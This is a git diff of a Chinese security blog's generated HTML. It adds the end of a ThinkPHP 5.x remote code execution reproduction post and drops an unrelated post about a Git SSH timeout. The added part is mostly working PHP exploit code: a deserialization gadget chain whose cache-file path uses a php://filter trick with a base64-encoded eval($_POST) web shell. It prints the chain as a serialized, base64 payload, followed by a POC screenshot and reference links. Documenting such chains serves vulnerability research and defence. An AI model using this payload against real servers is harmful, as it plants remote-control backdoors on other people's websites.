class="string">''</span>, </span><br><span class="line">                <span class="string">'path'</span>  =&gt; <span class="string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php'</span>,</span><br><span class="line">                <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">'xxx'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    $Output = <span class="keyword">new</span> think\console\Output($Memcached);</span><br><span class="line">    $model = <span class="keyword">new</span> think\db\Query($Output);</span><br><span class="line">    $HasOne = <span class="keyword">new</span> think\model\relation\HasOne($model);</span><br><span class="line">    $window = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot($Output,$HasOne));</span><br><span class="line">    <span class="keyword">echo</span> serialize($window);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($window));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="POC效果演示图"><a href="#POC效果演示图" class="headerlink" title="POC效果演示图"></a>POC效果演示图</h3><p><img src="/2020/07/30/test/Thinkphp5-x-RCE复现/14.jpg" alt=""></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://xz.aliyun.com/search?keyword=thinkphp" target="_blank" rel="noopener">https://xz.aliyun.com/search?keyword=thinkphp</a></li>
+<li><a href="https://y4er.com/post/thinkphp5-rce/#method-__contruct%E5%AF%BC%E8%87%B4%E7%9A%84rce-%E5%90%84%E7%89%88%E6%9C%ACpayload" target="_blank" rel="noopener">https://y4er.com/post/thinkphp5-rce/#method-__contruct%E5%AF%BC%E8%87%B4%E7%9A%84rce-%E5%90%84%E7%89%88%E6%9C%ACpayload</a></li>
+<li><a href="https://www.kancloud.cn/zmwtp/tp5/119422" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119422</a></li>
+<li><a href="https://www.anquanke.com/post/id/196364#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364#h2-7</a></li>
+</ol>
+
+        
+
+        
+    </section>
+</article>
+
+        </div>
+      
     
       
         <div class="post-wrapper">
@@ -781,74 +1008,6 @@
                     <a href="/tags/python/"><i class="fas fa-hashtag fa-fw"></i>python</a>
                 
                     <a href="/tags/flask/"><i class="fas fa-hashtag fa-fw"></i>flask</a>
-                
-            </div>
-        
-    </section>
-</article>
-
-        </div>
-      
-    
-      
-        <div class="post-wrapper">
-          <article class="post reveal ">
-    
-<section class="meta">
-  
-  <div class="meta" id="header-meta">
-    
-      <h2 class="title">
-          <a href="/2018/11/12/Git-提交出现ssh-connection-time-out/">
-              
-                  Git 提交出现ssh connection time out
-              
-          </a>
-      </h2>
-    
-
-    
-      <time class="metatag time">
-        <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;2018-11-12
-      </time>
-    
-
-    
-      
-    
-    <div class="metatag cats">
-        <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>&nbsp;<a class="categories" href="/categories/hexo/">hexo</a>
-    </div>
-
-
-    
-
-    
-
-    
-
-  </div>
-</section>
-
-    <section class="article typo">
-        <p>提交文章发生了奇怪的错误<br></p>
-        
-            <div class="readmore">
-                <a href="/2018/11/12/Git-提交出现ssh-connection-time-out/" class="flat-box">
-                    <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-                    阅读全文
-                </a>
-            </div>
-        
-
-        
-            <div class="full-width auto-padding tags">
-                
-                    <a href="/tags/hexo常见问题/"><i class="fas fa-hashtag fa-fw"></i>hexo常见问题</a>
-                
-                    <a href="/tags/Git/"><i class="fas fa-hashtag fa-fw"></i>Git</a>
-                
-                    <a href="/tags/debug/"><i class="fas fa-hashtag fa-fw"></i>debug</a>
                 
             </div>
         
